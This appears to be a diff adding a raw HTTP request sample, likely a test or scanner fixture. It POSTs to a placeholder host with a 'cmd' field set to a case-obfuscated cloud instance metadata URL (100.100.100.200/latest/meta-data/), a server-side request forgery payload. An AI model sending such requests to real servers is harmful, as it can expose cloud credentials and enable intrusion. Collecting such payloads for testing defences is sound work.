@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
+
+cmd=hTtP://100.100.100.200/lAtEsT/mEtA-dAtA/
